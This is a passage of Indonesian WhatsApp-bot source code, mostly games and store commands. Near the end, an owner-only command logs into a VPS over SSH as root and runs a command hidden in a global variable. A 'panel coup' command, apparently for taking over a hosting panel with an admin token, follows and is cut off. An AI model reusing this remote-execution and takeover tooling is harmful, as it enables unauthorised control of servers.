Status: Mau ke lokasi tujuan (${randomNomor(17, 22)}%)`
//===============
let njir = `${ya}
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬜⬜⬛
▫️▫️▫️▫️▫️▫️▫️▫️▫️▫️⬛⬆️⬜⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛🏍️⬜⬛
⬛⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬛
⬛🌳🏠⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
${jay}

*INFORMASI*
Lokasi awal: ${jay}
Lokasi tujuan: ${ya}

${orgnya}: 👤 (penumpang)
Ojek: 🏍️ ${db.data.users[m.sender].nama}
Status: Mau ke lokasi tujuan (${randomNomor(50, 57)}%)`
//==============
let lah = `${ya}
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜👤🏍️⬜⬜⬜⬜⬜⬜⬜⬜⬜⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬜⬜⬛
▫️▫️▫️▫️▫️▫️▫️▫️▫️▫️⬛⬜⬜⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬜⬜⬛
⬛⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬛
⬛🌳🏠⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
${jay}

*INFORMASI*
Lokasi awal: ${jay}
Lokasi tujuan: ${ya}
Status: Sampai ke tujuan`
//===============
let ong = randomNomor(10000, 50000)
let tai = `*BERHASIL NGOJEK*

Informasi penumpang
Nama: ${orgnya}
Ongkos: ${toRupiah(ong)}

Pendapatan Ngojek
Nama: ${db.data.users[m.sender].nama}
Money: ${toRupiah(ong)}`
aMonay(m.sender, ong, db_monay)
edit5(tmpan, bgt, njir, lah, tai)
}
break

case 'tebakgambar': {
if (from in tebakgambar) return m.reply('Masih ada sesi yang belum diselesaikan!');
var { img, jawaban, deskripsi } = pickRandom(JSON.parse(fs.readFileSync('./lib/game/tebakgambar.json')));
console.log('Jawaban: '+jawaban)
var teks1 = `*GAME TEBAK GAMBAR*\nPetunjuk: ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')}\nDeskripsi: ${deskripsi}\nWaktu: ${gamewaktu} detik\n\nKetik .nyerah untuk menyerah`
await rafatharcode.sendMessage(from, {image: {url: img}, caption: teks1}, {quoted: m})
tebakgambar[from] = {
soal: img,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakgambar[from]) m.reply(`*WAKTU HABIS!*\nJawaban: ${tebakgambar[from].jawaban}`);
delete tebakgambar[from];
}, gamewaktu * 1000)
}}
break

case 'tebakkalimat': {
if (from in tebakkalimat) return m.reply('Masih ada sesi yang belum diselesaikan!');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./lib/game/tebakkalimat.json')));
console.log('Jawaban: '+jawaban)
await m.reply(`*GAME TEBAK KALIMAT*\nSoal: ${soal}\nPetunjuk: ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')}\nWaktu: ${gamewaktu} detik\n\nKetik .nyerah untuk menyerah`)
tebakkalimat[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakkalimat[from]) m.reply(`*WAKTU HABIS!*\nJawaban dari soal: ${soal}\n\nAdalah: ${jawaban}`);
delete tebakkalimat[from];
}, gamewaktu * 1000)
}}
break

case 'tebakkata': {
if (from in tebakkata) return m.reply('Masih ada sesi yang belum diselesaikan!');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./lib/game/tebakkata.json')));
console.log('Jawaban: '+jawaban)
await m.reply(`*GAME TEBAK KATA*\nSoal: ${soal}\nPetunjuk: ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')}\nWaktu: ${gamewaktu} detik\n\nKetik .nyerah untuk menyerah`)
tebakkata[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakkata[from]) m.reply(`*WAKTU HABIS!*\nJawaban dari soal: ${soal}\n\nAdalah: ${jawaban}`);
delete tebakkata[from];
}, gamewaktu * 1000)
}}
break

case 'tebaklirik': {
if (from in tebaklirik) return m.reply('Masih ada sesi yang belum diselesaikan!');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./lib/game/tebaklirik.json')));
console.log('Jawaban: '+jawaban)
await m.reply(`*GAME TEBAK LIRIK*\nSoal: ${soal}\nPetunjuk: ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')}\nWaktu: ${gamewaktu} detik\n\nKetik .nyerah untuk menyerah`)
tebaklirik[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebaklirik[from]) m.reply(`*WAKTU HABIS!*\nJawaban dari soal:\n${soal}\n\nAdalah: ${jawaban}`);
delete tebaklirik[from];
}, gamewaktu * 1000)
}}
break

case 'tebakanime': {
if (from in tebakanime) return m.reply('Masih ada sesi yang belum diselesaikan!');
var { image, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./lib/game/tebakanime.json')));
console.log('Jawaban: '+jawaban)
var teks1 = `*GAME TEBAK ANIME*\nPetunjuk: ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')}\nWaktu: ${gamewaktu} detik\n\nKetik .nyerah untuk menyerah`
await rafatharcode.sendMessage(from, {image: {url: image}, caption: teks1}, {quoted: m})
tebakanime[m.chat] = {
soal: image,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakanime[m.chat]) m.reply(`*WAKTU HABIS!*\nJawaban: ${tebakanime[m.chat].jawaban}`);
delete tebakanime[m.chat];
}, gamewaktu * 1000)
}}
break

case 'tebaklagu': {
if (from in tebaklagu) return m.reply('Masih ada sesi yang belum diselesaikan!');
var { soal, artis, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./lib/game/tebaklagu.json')));
console.log('Jawaban: '+jawaban)
if (jawaban.toLowerCase() == 'Audio tidak ditemukan, silahkan request ulang!') return m.reply('Terjadi kesalahan')
var teks1 = `*GAME TEBAK LAGU*\nPetunjuk: ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')}\nArtis: ${artis}\nWaktu: ${gamewaktu} detik\n\nKetik .nyerah untuk menyerah`
rafatharcode.sendMessage(from, {audio: {url: soal}, mimetype: 'audio/mpeg', ptt: true}, {quoted: m})
await rafatharcode.sendMessage(from, {text: teks1}, {quoted:m})
tebaklagu[m.chat] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebaklagu[m.chat]) m.reply(`*WAKTU HABIS!*\nJawaban: ${tebaklagu[m.chat].jawaban}`);
delete tebaklagu[m.chat];
}, gamewaktu * 1000)
}}
break

case 'kuis': {
if (from in kuis) return m.reply('Masih ada sesi yang belum diselesaikan!');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./lib/game/kuis.json')));
console.log('Jawaban: '+jawaban)
await m.reply(`*GAME KUIS*\nSoal: ${soal}\nPetunjuk: ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')}\nWaktu: ${gamewaktu} detik\n\nKetik .nyerah untuk menyerah`)
kuis[m.chat] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (kuis[m.chat]) m.reply(`*WAKTU HABIS!*\nJawaban dari soal:\n${soal}\n\nAdalah: ${jawaban}`);
delete kuis[m.chat];
}, gamewaktu * 1000)
}}
break

case 'tebakkimia': {
if (from in tebakkimia) return m.reply('Masih ada sesi yang belum diselesaikan!');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./lib/game/tebakkimia.json')));
console.log('Jawaban: '+jawaban)
await m.reply(`*GAME TEBAK KIMIA*\nSoal: ${soal}\nWaktu: ${gamewaktu} detik\n\nKetik .nyerah untuk menyerah`)
tebakkimia[m.chat] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakkimia[m.chat]) m.reply(`*WAKTU HABIS!*\nNama unsur dari lambang ${soal}\n\nAdalah: ${jawaban}`)
delete tebakkimia[m.chat];
}, gamewaktu * 1000)
}}
break

case 'tebakbendera': {
if (from in tebakbendera) return m.reply('Masih ada sesi yang belum diselesaikan!');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./lib/game/tebakbendera.json')));
console.log('Jawaban: '+jawaban)
await m.reply(`*GAME TEBAK BENDERA*\nSoal: ${soal}\nPetunjuk: ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')}\nWaktu: ${gamewaktu} detik\n\nKetik .nyerah untuk menyerah`)
tebakbendera[m.chat] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakbendera[m.chat]) m.reply(`*WAKTU HABIS!*\nJawaban dari soal:\n${soal}\n\nAdalah: ${jawaban}`);
delete tebakbendera[m.chat];
}, gamewaktu * 1000)
}}
break

case 'siapakahaku': {
if (from in siapakahaku) return m.reply('Masih ada sesi yang belum diselesaikan!');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./lib/game/siapakahaku.json')));
console.log('Jawaban: '+jawaban)
await m.reply(`*GAME SIAPAKAH AKU*\nSoal: ${soal}\nPetunjuk: ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')}\nWaktu: ${gamewaktu} detik\n\nKetik .nyerah untuk menyerah`)
siapakahaku[m.chat] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (siapakahaku[m.chat]) m.reply(`*WAKTU HABIS!*\nJawaban dari soal:\n${soal}\n\nAdalah: ${jawaban}`);
delete siapakahaku[m.chat];
}, gamewaktu * 1000)
}}
break

case 'asahotak': {
if (from in asahotak) return m.reply('Masih ada sesi yang belum diselesaikan!');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./lib/game/asahotak.json')));
console.log('Jawaban: '+jawaban)
await m.reply(`*GAME ASAH OTAK*\nSoal: ${soal}\nPetunjuk: ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')}\nWaktu: ${gamewaktu} detik\n\nKetik .nyerah untuk menyerah`)
asahotak[m.chat] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (asahotak[m.chat]) m.reply(`*WAKTU HABIS!*\nJawaban dari soal:\n${soal}\n\nAdalah: ${jawaban}`);
delete asahotak[m.chat];
}, gamewaktu * 1000)
}}
break

case 'susunkata': {
if (from in susunkata) return m.reply('Masih ada sesi yang belum diselesaikan!');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./lib/game/susunkata.json')));
console.log('Jawaban: '+jawaban)
await m.reply(`*GAME SUSUN KATA*\nSoal: ${soal}\nPetunjuk: ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')}\nWaktu: ${gamewaktu} detik\n\nKetik .nyerah untuk menyerah`)
susunkata[m.chat] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (susunkata[m.chat]) m.reply(`*WAKTU HABIS!*\nJawaban dari soal:\n${soal}\n\nAdalah: ${jawaban}`);
delete susunkata[m.chat];
}, gamewaktu * 1000)
}}
break

case 'caklontong': {
if (from in caklontong) return m.reply('Masih ada sesi yang belum diselesaikan!');
var { soal, jawaban, deskripsi } = pickRandom(JSON.parse(fs.readFileSync('./lib/game/caklontong.json')));
console.log(`Jawaban: ${jawaban}\n${deskripsi}`)
await m.reply(`*GAME CAK LONTONG*\nSoal: ${soal}\nPetunjuk: ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')}\nWaktu: ${gamewaktu} detik\n\nKetik .nyerah untuk menyerah`)
caklontong[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (caklontong[from]) m.reply(`*WAKTU HABIS!*\nJawaban: ${jawaban}\n${deskripsi}`)
delete caklontong[from];
}, gamewaktu * 1000)
}}
break

case 'math': 
case 'kuismath': {
if (from in kuismath) return m.reply('Masih ada sesi yang belum diselesaikan!');
let { genMath, modes } = require('./lib/game/math')
if (!q) return m.reply( `*MODE*\n• ${Object.keys(modes).join('\n• ')}\n\nContoh: ${prefix+command} easy`)
if (!(Object.keys(modes)).includes(args[0])) return m.reply('Silahkan pilih modenya yang benar!')
var { soal, jawaban, waktu, hadiah } = await genMath(q.toLowerCase()).catch((err) => m.reply('Silahkan pilih modenya yang benar!'))
console.log('Jawaban: '+jawaban)
await m.reply(`*GAME KUIS MATH*\nSoal: Berapa hasil dari ${soal.toLowerCase()}\nWaktu: ${waktu / 1000} detik\n\nKetik .nyerah untuk menyerah`)
kuismath[from] = {
soal: soal,
jawaban: jawaban,
hadiah: randomNomor(2000, hadiah),
waktu: setTimeout(function () {
if (kuismath[from]) m.reply(`*WAKTU HABIS!*\nJawaban: ${jawaban}`)
delete kuismath[from];
}, waktu)
}}
break

case 'tebakgame': {
let anu = await fetchJson('https://raw.githubusercontent.com/qisyana/scrape/main/tebakgame.json')
let result = anu[Math.floor(Math.random() * anu.length)]
tebakgame[m.chat] = [
await rafatharcode.sendMessage(m.chat, {image: {url: result.img }, caption: `Apa nama Game diatas?\n\nWaktu: ${(120000 / 1000).toFixed(2)} detik\n\nKetik .nyerah untuk menyerah` }, { quoted: m }), result, 250,
setTimeout(() => {
if (tebakgame[m.chat]) {
m.reply(waktuHabis(result.jawaban))
delete tebakgame[m.chat]
}}, 120000)
]}
break

case 'slot': {
if (!m.isGroup) return onlyGrup()
try {
let _spin1 = pickRandom(['1', '2', '3', '4', '5']) 
let _spin2 = pickRandom(['1', '2', '3', '4', '5'])
let _spin3 = pickRandom(['1', '2', '3', '4', '5'])
let _spin4 = pickRandom(['1', '2', '3', '4', '5'])
let _spin5 = pickRandom(['1', '2', '3', '4', '5'])
let _spin6 = pickRandom(['1', '2', '3', '4', '5'])
let _spin7 = pickRandom(['1', '2', '3', '4', '5'])
let _spin8 = pickRandom(['1', '2', '3', '4', '5'])
let _spin9 = pickRandom(['1', '2', '3', '4', '5'])
let spin1 = (_spin1 * 1)
let spin2 = (_spin2 * 1)
let spin3 = (_spin3 * 1)
let spin4 = (_spin4 * 1)
let spin5 = (_spin5 * 1)
let spin6 = (_spin6 * 1)
let spin7 = (_spin7 * 1)
let spin8 = (_spin8 * 1)
let spin9 = (_spin9 * 1)
let spins1 = (spin1 == 1 ? '🍊' : spin1 == 2 ? '🍇' : spin1 == 3 ? '🍉' : spin1 == 4 ? '🍌' : spin1 == 5 ? '🍍' : '')
let spins2 = (spin2 == 1 ? '🍊' : spin2 == 2 ? '🍇' : spin2 == 3 ? '🍉' : spin2 == 4 ? '🍌' : spin2 == 5 ? '🍍' : '')
let spins3 = (spin3 == 1 ? '🍊' : spin3 == 2 ? '🍇' : spin3 == 3 ? '🍉' : spin3 == 4 ? '🍌' : spin3 == 5 ? '🍍' : '')
let spins4 = (spin4 == 1 ? '🍊' : spin4 == 2 ? '🍇' : spin4 == 3 ? '🍉' : spin4 == 4 ? '🍌' : spin4 == 5 ? '🍍' : '')
let spins5 = (spin5 == 1 ? '🍊' : spin5 == 2 ? '🍇' : spin5 == 3 ? '🍉' : spin5 == 4 ? '🍌' : spin5 == 5 ? '🍍' : '')
let spins6 = (spin6 == 1 ? '🍊' : spin6 == 2 ? '🍇' : spin6 == 3 ? '🍉' : spin6 == 4 ? '🍌' : spin6 == 5 ? '🍍' : '')
let spins7 = (spin7 == 1 ? '🍊' : spin7 == 2 ? '🍇' : spin7 == 3 ? '🍉' : spin7 == 4 ? '🍌' : spin7 == 5 ? '🍍' : '')
let spins8 = (spin8 == 1 ? '🍊' : spin8 == 2 ? '🍇' : spin8 == 3 ? '🍉' : spin8 == 4 ? '🍌' : spin8 == 5 ? '🍍' : '')
let spins9 = (spin9 == 1 ? '🍊' : spin9 == 2 ? '🍇' : spin9 == 3 ? '🍉' : spin9 == 4 ? '🍌' : spin9 == 5 ? '🍍' : '' )
let WinOrLose
if (spin1 == 1 && spin2 == 1 && spin3 == 1 && spin4 == 1 && spin5 == 1 && spin6 == 1 && spin7 == 1 && spin8 == 1 && spin9 == 1 || spin1 == 2 && spin2 == 2 && spin3 == 2 && spin4 == 2 && spin5 == 2 && spin6 == 2 && spin7 == 2 && spin8 == 2 && spin9 == 2 || spin1 == 3 && spin2 == 3 && spin3 == 3 && spin4 == 3 && spin5 == 3 && spin6 == 3 && spin7 == 3 && spin8 == 3 && spin9 == 3 || spin1 == 4 && spin2 == 4 && spin3 == 4 && spin4 == 4 && spin5 == 4 && spin6 == 4 && spin7 == 4 && spin8 == 4 && spin9 == 4 || spin1 == 5 && spin2 == 5 && spin3 == 5 && spin4 == 5 && spin5 == 5 && spin6 == 5 && spin7 == 5 && spin8 == 5 && spin9 == 5) {
WinOrLose = "Kamu menang lagi dan mendapatkan Mega Jackpot!"
} else if (spin4 == 1 && spin5 == 1 && spin6 == 1 || spin4 == 2 && spin5 == 2 && spin6 == 2 || spin4 == 3 && spin5 == 3 && spin6 == 3 || spin4 == 4 && spin5 == 4 && spin6 == 4 || spin4 == 5 && spin5 == 5 && spin6 == 5) {
WinOrLose = "Kamu menang dan mendapatkan Jackpot!"  
} else if (spin1 == 1 && spin2 == 1 && spin3 == 1 || spin1 == 2 && spin2 == 2 && spin3 == 2 || spin1 == 3 && spin2 == 4 && spin3 == 3 || spin1 == 4 && spin2 == 4 && spin3 == 4 || spin1 == 5 && spin2 == 5 && spin3 == 5 || spin1 == 6 && spin2 == 6 && spin3 == 6 || spin1 == 7 && spin2 == 7 && spin3 == 7 || spin1 == 8 && spin2 == 8 && spin3 == 8 || spin1 == 9 && spin2 == 9 && spin3 == 9) { 
WinOrLose = "Kamu menang dalam pertandingan ini!"
} else {
WinOrLose = "Kamu kalah dalam pertandingan ini!"
}
m.reply(`*—————— 「 GAME  SLOT 」 ——————*

${spins1} ${spins2} ${spins3}
${spins4} ${spins5} ${spins6}
${spins7} ${spins8} ${spins9}

${WinOrLose}`.trim(), )
} catch (err) {
m.reply('Terjadi kesalahan')
}
}
break

case 'nyerah': {
if (m.chat in tebakgambar) {
let { soal, jawaban, hadiah, waktu } = tebakgambar[m.chat]
clearTimeout(waktu)
delete tebakgambar[m.chat]
return rafatharcode.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
}
if (m.chat in tebakkalimat) {
let { soal, jawaban, hadiah, waktu } = tebakkalimat[m.chat]
clearTimeout(waktu)
delete tebakkalimat[m.chat]
return rafatharcode.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
}
if (m.chat in tebakkata) {
let { soal, jawaban, hadiah, waktu } = tebakkata[m.chat]
clearTimeout(waktu)
delete tebakkata[m.chat]
return rafatharcode.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
}
if (m.chat in tebaklirik) {
let { soal, jawaban, hadiah, waktu } = tebaklirik[m.chat]
clearTimeout(waktu)
delete tebaklirik[m.chat]
return rafatharcode.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
}
if (m.chat in tebakanime) {
let { soal, jawaban, hadiah, waktu } = tebakanime[m.chat]
clearTimeout(waktu)
delete tebakanime[m.chat]
return rafatharcode.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
}
if (m.chat in tebaklagu) {
let { soal, jawaban, hadiah, waktu } = tebaklagu[m.chat]
clearTimeout(waktu)
delete tebaklagu[m.chat]
return rafatharcode.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
}
if (m.chat in kuis) {
let { soal, jawaban, hadiah, waktu } = kuis[m.chat]
clearTimeout(waktu)
delete kuis[m.chat]
return rafatharcode.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
}
if (m.chat in tebakkimia) {
let { soal, jawaban, hadiah, waktu } = tebakkimia[m.chat]
clearTimeout(waktu)
delete tebakkimia[m.chat]
return rafatharcode.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
}
if (m.chat in tebakbendera) {
let { soal, jawaban, hadiah, waktu } = tebakbendera[m.chat]
clearTimeout(waktu)
delete tebakbendera[m.chat]
return rafatharcode.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
}
if (m.chat in siapakahaku) {
let { soal, jawaban, hadiah, waktu } = siapakahaku[m.chat]
clearTimeout(waktu)
delete siapakahaku[m.chat]
return rafatharcode.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
}
if (m.chat in asahotak) {
let { soal, jawaban, hadiah, waktu } = asahotak[m.chat]
clearTimeout(waktu)
delete asahotak[m.chat]
return rafatharcode.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
}
if (m.chat in susunkata) {
let { soal, jawaban, hadiah, waktu } = susunkata[m.chat]
clearTimeout(waktu)
delete susunkata[m.chat]
return rafatharcode.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
}
if (m.chat in caklontong) {
let { soal, jawaban, hadiah, waktu } = caklontong[m.chat]
clearTimeout(waktu)
delete caklontong[m.chat]
return rafatharcode.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
}
if (m.chat in kuismath) {
let { soal, jawaban, hadiah, waktu } = kuismath[m.chat]
clearTimeout(waktu)
delete kuismath[m.chat]
return rafatharcode.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
}
if (m.chat in tebakgame) {
clearTimeout(tebakgame[m.chat][3])
delete tebakgame[m.chat]
return rafatharcode.sendMessage(m.chat, {text: `Yahh, masa nyerah :)`}, {quoted: m})
}}
break

// === Rpg Menu



// === Store Menu

case 'tambah': {
if (!text.includes('+')) return m.reply(`Contoh: ${prefix+command} angka+angka+...`);
const arg = args.join(' ');
const angkaArray = arg.split('+').map(Number);
const hasil = angkaArray.reduce((acc, num) => acc + num, 0);
if (isNaN(hasil)) {
m.reply('Angka tidak valid. Pastikan untuk memasukkan angka yang benar.');
} else {
m.reply(`Hasil: ${toRupiah(hasil)}`);
}}
break;

case 'kurang': {
if (!text.includes('-')) return m.reply(`Contoh: ${prefix+command} angka-angka-...`);
const arg = args.join(' ');
const angkaArray = arg.split('-').map(Number);
const hasil = angkaArray.reduce((acc, num) => acc - num);
if (isNaN(hasil)) {
m.reply('Angka tidak valid. Pastikan untuk memasukkan angka yang benar.');
} else {
m.reply(`Hasil: ${toRupiah(hasil)}`);
}}
break;

case 'kali': {
if (!text.includes('*')) return m.reply(`Contoh: ${prefix+command} angka*angka*...`);
const arg = args.join(' ');
const angkaArray = arg.split('*').map(Number);
const hasil = angkaArray.reduce((acc, num) => acc * num, 1);
if (isNaN(hasil)) {
m.reply('Angka tidak valid. Pastikan untuk memasukkan angka yang benar.');
} else {
m.reply(`Hasil: ${toRupiah(hasil)}`);
}}
break;

case 'bagi': {
if (!text.includes('/')) return m.reply(`Contoh: ${prefix+command} angka/angka/...`);
const arg = args.join(' ');
const angkaArray = arg.split('/').map(Number);
const hasil = angkaArray.reduce((acc, num) => acc / num);
if (isNaN(hasil)) {
m.reply('Angka tidak valid. Pastikan untuk memasukkan angka yang benar.');
} else {
m.reply(`Hasil: ${toRupiah(hasil)}`);
}}
break;

case 'buygold':
case 'topupg': {
if (!text) return m.reply(`Masukkan nominal gold yang ingin dibeli.\nContoh: ${prefix + command} 1`);
const hargaPerGold = 7000;
const nominal = parseInt(args[0]);
if (isNaN(nominal) || nominal <= 0) return m.reply('Minimal pembelian 1 gold');
const totalHarga = nominal * hargaPerGold;
const saldoSaatIni = cekSaldo(m.sender, db_saldo);
if (saldoSaatIni < totalHarga) {
return m.reply(`Info Harga ${nominal} Gold\nSaldo kamu: ${toRupiah(saldoSaatIni)}\nHarga total: Rp. ${toRupiah(totalHarga)}\n\nSaldo kamu tidak cukup.`);
}
addGold(m.sender, nominal, db_gold);
minSaldo(m.sender, totalHarga, db_saldo);
const hargaPerGoldFormatted = toRupiah(hargaPerGold);
const totalHargaFormatted = toRupiah(totalHarga);
const saldoAkhirFormatted = toRupiah(cekSaldo(m.sender, db_saldo));
await m.reply(`🔔 Transaksi Berhasil! 🔔\n\n✨ Kamu berhasil membeli ${nominal} gold. ✨\n\nRincian Pembelian:\n${nominal} gold x Rp. ${hargaPerGoldFormatted} = Rp. ${totalHargaFormatted}\n\n💵 Saldo kamu sekarang: Rp. ${saldoAkhirFormatted}`);
}
break;

// Installl 

case 'hbpanel': {
 if (!isOwner) return onlyOwn()
 
 let t = text.split(',');
 if (t.length < 3) return rafatharcodereply(`*Format salah!*\nPenggunaan: ${prefix}hbpanel ipvps,password,username,password,domainpanel`)
 
 let ipvps = t[0];
 let passwd = t[1];
 let user = t[2];
 let psswdhb = t[3];
 let domainpnl = t[4];

 const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
 };

 // Gunakan string terenkripsi di kode Anda
 const command = `${global.bash}`
 const conn = new Client();
 
 conn.on('ready', () => {
 isSuccess = true; // Set flag menjadi true jika koneksi berhasil
rafatharcodereply(`*PROSES HB PANEL CIK🥵*`);
 
 conn.exec(command, (err, stream) => {
 if (err) throw err;
 stream.on('close', (code, signal) => {
 console.log('Stream closed with code ' + code + ' and signal ' + signal);
rafatharcodereply(`*BERIKUT DATA PANEL ANDA*\n\n*LINK LOGIN:* ${domainpnl}\n*USERNAME:* ${user}\n*PASSWORD:* ${psswdhb}\n\n*NOTES:*\n*SIMPAN DATA VPS SECARA BAIK² JANGAN SAMPAI HILANG TERIMAKASIH🥰*`)
 conn.end();
 }).on('data', (data) => {
 stream.write(`${global.tokeninstall}\n`);
 stream.write('8\n');
 stream.write(`${pw}\n`);
 stream.write(`${pw}\n`);
 console.log('STDOUT: ' + data);
 }).stderr.on('data', (data) => {
 console.log('STDERR: ' + data);
 });
 });
 }).on('error', (err) => {
 console.log('Connection Error: ' + err);
 rafatharcodereply('Katasandi atau IP tidak valid');
 }).connect(connSettings);
 }
 
 break

case 'kudetapanel':{
if (!isOwner) return onlyOwn()
let t = text.split(',');
if (t.length < 2) return rafatharcodereply(`*Format salah!*\nPenggunaan: ${prefix+command} tokenptla,domainpnl`);

let tokenptla = t[0];
let domainpnl = t[1];

// Menghapus "https://" jika sudah ada di depan
if (domainpnl.startsWith('https://')) {
  domainpnl = domainpnl.slice(8);
}

// Menambahkan "https://" di depan domainpnl
domainpnl = 'https://' + domainpnl;

rafatharcodereply('Mengonfirmasi....')
await sleep(500)
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: false, 
 forwardedNewsletterMessageInfo: {
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: rafatharcode.decodeJid(rafatharcode.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: 'Apakah Anda Yakin? Ingin Kudeta Panel Ini?'
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "quick_reply",
 "buttonParamsJson": `{\"display_text\":\"Ya\",\"id\":\".kudetpanel ${tokenptla},${domainpnl}\"}`
 },
 {
 "name": "quick_reply",
 "buttonParamsJson": `{\"display_text\":\"Tidak!!\",\"id\":\".btlkdtpanel\"}`
 },
 ]
 })
 })
 }
 }
}, {})

await rafatharcode.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break

case 'kudetpanel': {
